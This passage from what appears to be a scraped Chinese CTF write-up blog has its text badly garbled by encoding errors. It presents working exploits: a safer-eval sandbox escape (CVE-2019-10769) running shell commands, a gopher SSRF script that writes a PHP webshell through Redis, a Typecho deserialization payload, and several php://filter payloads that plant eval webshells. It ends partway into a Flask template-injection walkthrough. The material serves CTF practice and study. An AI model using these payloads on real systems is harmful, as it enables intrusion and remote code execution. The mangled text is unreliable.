&#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹ setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); æ³¨æ„æ ¸å¿ƒä»£ç åœ¨worker2åˆ°worker3ä¹‹é—´ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœdelayè¢«è®¾ç½®æˆäº†60*1000 è€Œè¶…æ—¶æ˜¯1000.å¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œåè€Œä¼šnextï¼Œä¹Ÿå°±æ˜¯ä¼šç»§ç»­æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ç›´æ¥å¼¹å›å»è¶…æ—¶ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸‹ä¸€æ­¥ 123456789101112app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; res.send(String(response));&#125;); ä¸‹é¢ä½¿ç”¨äº†saferEvalçš„ä»£ç ï¼Œæ¥æ”¶eçš„å‚æ•°ï¼Œäºæ˜¯æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ¸…æ™°ï¼Œé¦–å…ˆå°è¯•ç»•è¿‡å¯¹è¶…æ—¶çš„é™åˆ¶ï¼Œå†æœä¸€ä¸‹saferEvalçš„æ•°æ®~ï¼Œæ–‡æ¡£è¯´åˆ°ï¼š 1parseInt(string, radix) å‚æ•° æè¿° string å¿…éœ€ã€‚è¦è¢«è§£æçš„å­—ç¬¦ä¸²ã€‚ radix å¯é€‰ã€‚è¡¨ç¤ºè¦è§£æçš„æ•°å­—çš„åŸºæ•°ã€‚è¯¥å€¼ä»‹äº 2 ~ 36 ä¹‹é—´ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°æˆ–å…¶å€¼ä¸º 0ï¼Œåˆ™æ•°å­—å°†ä»¥ 10 ä¸ºåŸºç¡€æ¥è§£æã€‚å¦‚æœå®ƒä»¥ â€œ0xâ€ æˆ– â€œ0Xâ€ å¼€å¤´ï¼Œå°†ä»¥ 16 ä¸ºåŸºæ•°ã€‚å¦‚æœè¯¥å‚æ•°å°äº 2 æˆ–è€…å¤§äº 36ï¼Œåˆ™ parseInt() å°†è¿”å› NaNã€‚ è¿™ä¹Ÿå°±è¯´æ˜ï¼Œå¦‚æœä¼ å…¥delayæ˜¯å¾ˆå¤§å¾ˆå¤§çš„æ•°ï¼Œä¹Ÿå°±ä¸èƒ½è¢«è§£æäº†ï¼Œé‚£æˆ‘ä»¬çš„delayæ­¤æ—¶å˜æˆäº†1ç§’ï¼Œä¹Ÿå°±ç»•è¿‡äº†è¶…æ—¶é™åˆ¶ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œå’¯ï¼Œå°è¯•ï¼š å‘ç°æ­¤æ—¶å°±ç»•è¿‡äº†è¶…æ—¶çš„é™åˆ¶äº†ï¼ï¼Œäºæ˜¯å†æ„é€ æ‰§è¡ŒEvalSaferçš„ä»£ç ï¼ŒæŸ¥åˆ°æ˜¯CVE-2019-10769 1https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10 payloadå¦‚ä¸‹ï¼š 123456789const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); å…¶ä¸­æ ¸å¿ƒä»£ç å°±æ˜¯theFunctionï¼Œæˆ‘ä»¬ä¼ å…¥è¿›å»æ±¡æŸ“å‚æ•°å³å¯æ‰§è¡Œä»£ç  4.EzWebæ˜¯ä¸€ä¸ªredisçš„é¢˜ç›®..æ²¡æœ‰åšè¿‡è¿™æ ·çš„ï¼Œç¡¬ç€å¤´çš®åšå§ï¼Œè®¿é—®ä¹‹åæ ¹æ®æç¤ºè®¿é—® ?secret æŸ¥è¯¢äº†ä¸€äº›ï¼Œè¿™æ˜¯å†…ç½‘çš„ç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´è™½ç„¶é¢˜ç›®è¿‡æ»¤äº†127.0.0.1,ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æµ‹è¯•å…¶ä»–é¶æœºçš„å†…å®¹ è®¿é—®è¿‡å»ä¹‹åå¥½åƒä¹Ÿä¸æ˜¯å•¥ç©æ„å„¿å•Š,å°è¯•ç”¨fileåè®®çš„æ¼æ´è¯»åˆ°äº†index.phpçš„æºç ï¼š file:[ç©ºæ ¼]/ 1?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;æäº¤ 123456789101112131415161718192021222324&lt;!--?secret--&gt;&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;åˆ«è¿™æ ·&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; æˆ‘ä»¬å‘ç°è¿‡æ»¤äº†dictåè®®ï¼Œfileåè®®ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ï¼Œæˆ‘ä»¬çŒœæƒ³å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬åˆ©ç”¨httpåè®®è¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œgopheråè®®è¿›è¡Œæ”»å‡»,æœç„¶ï¼Œåœ¨11ç«¯å£ä¸Šæ‰¾åˆ°äº†å˜åŒ– è®©æˆ‘ä»¬å°è¯•æœåŠ¡ï¼Œå› ä¸ºssrfå¸¸ç”¨çš„å‡ ä¸ªæœåŠ¡å°±æ˜¯mysqlå’Œredisï¼Œäºæ˜¯åˆ†åˆ«è®¿é—®3306ç«¯å£å’Œ6379ç«¯å£ 6379ä¸Šå¾—åˆ°ï¼š å‘ç°æœç„¶æœ‰ERRç«¯å£ï¼Œäºæ˜¯å°è¯•ç”¨gopheråè®®æ‰“ä¸€æ³¢ï¼Œè¿™é‡Œç›´æ¥ç”¨äº†ä¸€æ³¢åˆ«äººçš„è„šæœ¬ 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot; // è¿è¡Œæœ‰redisçš„ä¸»æœºipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload æˆ‘ä»¬æ”¹ä¸€ä¸‹ä¸»æœºIPä¸º:10.160.187.11 å¾—åˆ°payload: 1gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 5.EZä¸‰å‰‘å®¢-EzTypechoè¿™é“é¢˜ç›®ï¼Œå‘ƒï¼ŒåŸç†æ¯”è¾ƒéš¾ï¼Œä½†æ˜¯åˆ©ç”¨èµ·æ¥å´å¾ˆç®€å•ï¼Œæ¯”å¦‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html expå°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œåœ¨åšé¢˜çš„æ—¶å€™ç›´æ¥åœ¨finishæ—¶ä¼šå‘ç°æ— æ³•åˆ©ç”¨çš„æƒ…å†µ è¿™ä¸ªæ—¶å€™å°±å¿…é¡»çœ‹æºç äº† æŸ¥æ‰¾sessionï¼Œåœ¨æºç ä¸­å¯ä»¥æ‰¾åˆ°ï¼š 12345678910 &lt;?php else : ?&gt; &lt;?php//if(!isset($_SESSION)) &#123; die(&#x27;no, you can\\&#x27;t unserialize it without session QAQ&#x27;);&#125; $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); Typecho_Cookie::delete(&#x27;__typecho_config&#x27;); $db = new Typecho_Db($config[&#x27;adapter&#x27;], $config[&#x27;prefix&#x27;]); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; æˆ‘ä»¬å»æŸ¥æ‰¾sesionåœ¨å“ªé‡Œèµ‹å€¼ï¼š ç»“æœå‘ç°ä¸€æ—¦åœ¨è¿™é‡Œå°±è¢«exitåœä¸‹æ¥äº†ï¼Œäºæ˜¯æŸ¥æ‰¾startï¼Œç»“æœå‘ç°æºç å½“ä¸­ï¼š 1234&lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); $type = explode(&#x27;_&#x27;, $config[&#x27;adapter&#x27;]); $type = array_pop($type); å‘ç°å®ƒå±…ç„¶æ¥æ”¶ä¸€ä¸ªå‚æ•°â€¦é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç”¨è¿™ä¸ªå»æ‰“å°±è¡Œäº†ï¼Œåˆ©ç”¨è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Typecho_Feed&#123; private $_type; private $_items = array(); public function __construct()&#123; $this-&gt;_type = &quot;RSS 2.0&quot;; $this-&gt;_items = array( array( &quot;title&quot; =&gt; &quot;test&quot;, &quot;link&quot; =&gt; &quot;test&quot;, &quot;data&quot; =&gt; &quot;20190430&quot;, &quot;author&quot; =&gt; new Typecho_Request(), ), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params = array( &quot;screenName&quot; =&gt; &quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;, ); $this-&gt;_filter = array(&quot;assert&quot;); &#125;&#125;$a = new Typecho_Feed();$c = array( &quot;adapter&quot; =&gt; $a, &quot;prefix&quot; =&gt; &quot;test&quot;,);echo base64_encode(serialize($c)); æ‹¿åˆ°flagï¼š æ€»ç»“ï¼šâ€‹ é¢˜ç›®è™½ç„¶åŸç†éƒ½å¾ˆéš¾ï¼Œä½†æ˜¯åˆ©ç”¨å´å¾ˆç®€å•ï¼Œè‡ªå·±å…ˆæŠŠé¢˜ç›®æˆåŠŸçš„å¤ç°æ¥å‡ºæ¥äº†ï¼Œä»¥åå†é€æ­¥å¤ç°åŸç†æŠŠã€‚","categories":[],"tags":[]},{"title":"å…¨å›½å·¥æ§2020-web-easyphp","slug":"å…¨å›½å·¥æ§2020-web-easyphp","date":"2020-10-27T06:25:53.000Z","updated":"2020-10-27T06:26:22.997Z","comments":true,"path":"2020/10/27/å…¨å›½å·¥æ§2020-web-easyphp/","link":"","permalink":"http://example.com/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/","excerpt":"","text":"å…¨å›½å·¥æ§2020-web-easyphp1.ä»ä¼ªåè®®å¼€å§‹è¯´èµ·php://filteræ˜¯PHPä¸­ç‹¬æœ‰çš„åè®®ï¼Œè¯¥åè®®æµå…è®¸æˆ‘ä»¬ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œ åœ¨ä¹‹å‰ä¸‰ä¸ªç™½å¸½ä¸­æœ‰ä¸€ä¸ªæ¯”èµ›ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†çš„ä»£ç ï¼š 1234&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 1.base64åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹è§ï¼Œå¦‚æœæ­£å¸¸çš„ç¼–è¯‘ä»£ç ï¼Œç”±äºåœ¨å¼€å¤´åŠ å…¥äº†exitå†…å®¹ï¼Œå³ä½¿æˆ‘ä»¬å†™å…¥äº†ä¸€å¥è¯ä¹Ÿæ— æ³•è§£æã€‚ ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡filenameåœ¨phpå†™å…¥çš„æ—¶å€™æ„é€ åè®®ï¼Œæ‰€ä»¥åˆ©ç”¨base64-decodeæ–¹æ³•è§£ç æ„é€ ä¸€å¥è¯çš„payloadï¼š 1PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¼šå‘ç°å¦‚æœç›´æ¥æ‰“å…¥è¿›å»ï¼Œbase64è§£ææ²¡æœ‰æˆåŠŸï¼Œè¿™å°±æ˜¯å› ä¸ºbaseæ˜¯ç”±4å­—èŠ‚ç»„æˆä¸€æ¬¡payloadã€‚æ‰€ä»¥è¯è¯´å›å»ï¼Œ å½“æˆ‘ä»¬ä½¿ç”¨base64decodeåè®®çš„æ—¶å€™ï¼Œ&lt; ? ; ?&gt;ç­‰ç­‰éƒ½ä¸ä¼šè¢«è§£æï¼Œæ‰€ä»¥æºä»£ç åˆ™ä¼šè¢«è¯†åˆ«ä¸ºï¼š phpexitï¼Œè€Œbase64æ˜¯å››ä¸ªå­—èŠ‚è¿˜åŸæˆä¸€ä¸ªå­—æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦å†å ä¸€ä¸ªä½æ•°ï¼Œç»™å¥¹ï¼Œä¹Ÿå°±æ˜¯phpexit[?]æ„é€ æˆå…«ä¸ªå­—èŠ‚ä¾›basedecodeä½¿ç”¨ï¼Œä¹‹ååœ¨åé¢å†ç¼–ä¸Šæˆ‘ä»¬è‡ªå·±çš„payloadï¼Œæ‰€ä»¥è¿™é“é¢˜å¯ä»¥æ„é€ å¦‚ä¸‹ï¼š 1filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg== ä½†æ˜¯è¿™é‡Œä»éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬æ„é€ çš„æ—¶å€™payloadå½“ä¸­ä¸å…è®¸å‡ºç°+å·ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦åˆ™ä¼šé‡è§æ²¡æœ‰è¢«å†™ä¸Šå»æƒ…å†µã€‚ï¼Œå®é™…ä¸Šï¼Œé™¤äº†baseè¿‡æ»¤å™¨ï¼Œè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤å™¨å¯ä»¥ä¾›ç»™æˆ‘ä»¬ä½¿ç”¨ï¼š å®˜ç½‘ï¼š 123https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php è¿‡æ»¤å™¨https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php è½¬æ¢è¿‡æ»¤å™¨https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php å­—ç¬¦è¿‡æ»¤å™¨ 2.rot13é™¤æ­¤ä¹‹å¤–æˆ‘å°è¯•ä½¿ç”¨rot13æ¥ç»•è¿‡ï¼Œä½†æ˜¯ä¼šå‘ç°rot13ä¹‹åçš„ç»“æœä¸åˆæ³• 1filename=php://filter/write=string.rot13/resource=shell.php&amp;txt=&lt;?cuc cucvasb();?&gt; å¾—åˆ°phpä¸ºï¼š 1&lt;?cuc rkvg; ?&gt;&lt;?php phpinfo();?&gt; è¿™æ ·çš„è¯ï¼Œå› ä¸ºå¤šäº†ä¸€ä¸ªåˆ†å·ï¼Œè€Œå¯¼è‡´å¤±è´¥äº†ï¼ˆå¼€å¯çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼Œåªè¦ç”¨&lt;? ?&gt;ä¸­çš„å†…å®¹å°±ä¼šè¢«è§£æï¼‰ä½†å¦‚æœå…³é—­çŸ­æ ‡ç­¾çš„æƒ…å†µä¸‹ï¼š 1txt=?&gt;&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php æˆåŠŸï¼é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜è¡¥å……ä¸€ç§éªšæ€è·¯ï¼š 3.iconvå­—ç¬¦ç¼–ç è½¬æ¢1echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;) iconvå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå½“å‰ç¼–ç ï¼Œè½¬æ¢åç¼–ç ï¼Œä¹‹åå†è½¬å›å»ï¼Œæ‰€ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åå…¶é“è¡Œä¹‹ã€‚ä½†æ˜¯åœ¨è¿™é‡Œï¼Œåˆ©ç”¨è¯¥å­—ç¬¦ç¼–ç ï¼Œä¼šå¯¼è‡´å‡ºç°ä¹‹å‰çš„+å·çš„é—®é¢˜ï¼Œäºæ˜¯å°±å¤±è´¥äº† 1filename=php://filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4- æ ¹æ®å¤§ä½¬ç»™å‡ºçš„UCS2-2 ç¼–ç çš„æ–¹å¼ï¼š 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;); éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUCS2çš„ç¼–ç æ–¹å¼æ˜¯2ä½ä¸€æ¬¡è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ä¿è¯éœ€è¦è½¬æ¢çš„ç¼–ç ä¸º2ä½æ•°ï¼Œä¸å¤Ÿçš„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºæ ¼å ä½,è€Œæˆ‘ä»¬ä¸Šé¢çš„è½¬æ¢ä¹‹åç›´æ¥ç”¨çš„è¯ï¼Œä¼šå‘ç°æ— æ³•è½¬æ¢ï¼Œè¿™æ˜¯å› ä¸ºå¿…é¡»ä¿è¯&lt;?php exit();ä¹Ÿè¢«æˆåŠŸè½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å†å‰é¢å†åŠ ä¸Šä¸€ä¸ª1å³å¯ï¼Œ æœ€ç»ˆpayloadï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;? å†™å…¥shellï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;? 4.ç»„åˆä½¿ç”¨ï¼š 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;? è¿˜å¯ä»¥å°è¯•ä½¿ç”¨srtip_tags+base64çš„æ–¹å¼è¿›è¡Œç»•è¿‡ 1filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=?&gt;PD9waHAgcGhwaW5mbygpOyA/Pg== ç»è¿‡è¯¥æ–¹å¼æ„é€ çš„payloadï¼Œä¼šè¿›è¡Œstrip_tagsï¼Œå»é™¤æ‰äº†å‰é¢çš„å†…å®¹ï¼Œä¹‹åå†ç”¨base64è§£å‹äº†æˆ‘ä»¬çš„å†…å®¹ã€‚ è®²å®Œä¸Šé¢çš„ï¼Œå†å›åˆ°wmctfçš„check in2ï¼Œé¢˜ç›®çš„æºç ä¸ºï¼š 123456789101112&lt;?phperror_reporting(0);highlight_file(__FILE__);if (isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if (preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\\.\\./i&#x27;, $content)) die(&#x27;hacker&#x27;); if (file_exists($content)) require_once($content); file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);&#125; è¿‡æ»¤å™¨è¿‡æ»¤äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªå‰©ä¸‹äº†å‹ç¼©è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡zlib.inflateè§£å‹å­—ç¬¦ï¼Œä¹‹åå†åˆ©ç”¨zlib.deflateå‹ç¼©çš„æ–¹å¼getshellï¼Œstr.tolowerä¼šåœ¨ 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt; é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰äºŒæ¬¡ç¼–ç ç»•è¿‡çš„æ–¹å¼ 1http://localhost/?content=php://filter/write=string.%7%32ot13|?&gt;&lt;?cuc cucvasb();?&gt;|/resource=shell.php è€Œæ˜¨å¤©çš„æ¯”èµ›è¿‡æ»¤äº†tolower,upperç­‰ç­‰ï¼Œç”šè‡³åˆæŠŠ%è¿‡æ»¤äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç”¨ä¸Šé¢ä¸¤ä¸ªpayloadäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨zlibçš„ deflateï¼Œä¹‹åå†åˆ©ç”¨urlç¼–ç è§£æï¼Œå¾—å‡ºå¦‚ä¸‹payload 123php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=shell.php","categories":[],"tags":[]},{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2020-10-27T06:09:46.441Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš","text":"ä¸€ç›´å¯¹sstiæ¯”è¾ƒæ¨¡ç³Šï¼Œé‡è§çš„æ—¶å€™éƒ½æ˜¯ç½‘ä¸Šå»ç…§æŠ„payloadå»æ‰“ï¼Œè‡ªå·±æ²¡æœ‰ä»€ä¹ˆä¸»åŠ¨æ„é€ payloadçš„èƒ½åŠ›ï¼Œè¿™æ¬¡é‡è§ä¸€é“é¢˜å†³å®šæ€»ç»“ä¸€äº›è¯¥æ€ä¹ˆåš 1.hackbar è‡ªå¸¦çš„payloadå¦‚ä½•æ„æˆçš„ç¬¬ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯æ­å»ºæˆ‘ä»¬çš„ç¯å¢ƒï¼š 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) è¿™ç§å°±æ˜¯æœ€åŸºæœ¬çš„flaskï¼Œåœ¨flaskå½“ä¸­jinjiaçš„æ¨¡æ¿ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªèŠ±æ‹¬å·å°±å¯ä»¥å…è®¸ä¸€äº›åŸºæœ¬çš„è¿ç®— ç”¨äºæ‰§è¡Œifï¼Œforå¾ªç¯ç­‰ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ä¸ªæœ€åŸºæœ¬çš„payloadçš„æ„é€ æ–¹å¼æ˜¯è¯¥æ€ä¹ˆè§¦å‘å‘¢ï¼Ÿç¬¬ä¸€æ­¥ï¼Œä»configç±»è§¦å‘ï¼Œå› ä¸ºFlaské‡Œé¢è‡ªå¸¦ 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; é€šè¿‡è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„flaskçš„config~ï¼Œè€Œè¿™ä¸€çš„æ„ä¹‰å¥½åƒä¸æ˜¯å¾ˆå¤§ï¼Ÿæˆ‘ä»¬å¾—ä¸åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä½œä¸ºè·³æ¿ï¼Œæ‰§è¡Œä¸‹ä¸€æ­¥ 1.__class__.__init__ __classæ–¹æ³•å±æ€§çš„æ—¶å€™ä¼šåªæƒ³è¯¥å®ä¾‹å¯¹åº”çš„ç±»ï¼Œæ­¤æ—¶configçš„ç±»æ˜¯Config,ç„¶åå¯ä»¥å†å»è°ƒç”¨å…¶å®ƒç±»å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬å®¡è®¡äº†æºç ï¼Œå°±å¯ä»¥çŸ¥é“æˆ‘ä»¬æ­¤æ—¶çš„Configç±»ä½äºconfig.py80å¤šè¡Œï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ__init__ä¹‹åï¼Œä¾¿å¯ä»¥åœ¨ä¸‹é¢çš„101è¡Œæ‰¾åˆ°è¿™ä¹ˆä¸€è¡Œä»£ç ï¼š 1rv = os.environ.get(variable_name) ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„configç±»å½“ä¸­å«æœ‰osåº“çš„æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ˜¯ä¸è¡Œçš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡globalså‡½æ•°å…ˆè·å–åˆ°å®ƒï¼Œäºæ˜¯å¾—åˆ°ï¼š globals() å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡,åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼š 1__globals__ äºæ˜¯æˆ‘ä»¬æ‹¼æ¥å¾—åˆ°å¦‚ä¸‹çš„payload: 1config.__class__.__init__.__globals__ å¯ä»¥å¾—åˆ°ï¼š æˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼æ¥è·å–osåº“ï¼Œåˆ©ç”¨__dictè¿™ä¸ªæ–¹æ³•æ¥æŸ¥çœ‹osåº“å“ªäº›å¯ä»¥ç»™æˆ‘ä»¬è¿›è¡Œä½¿ç”¨ 1.__globals__[&#x27;os&#x27;] æˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°systemï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨è¯¥æ–¹æ³•å´æ— 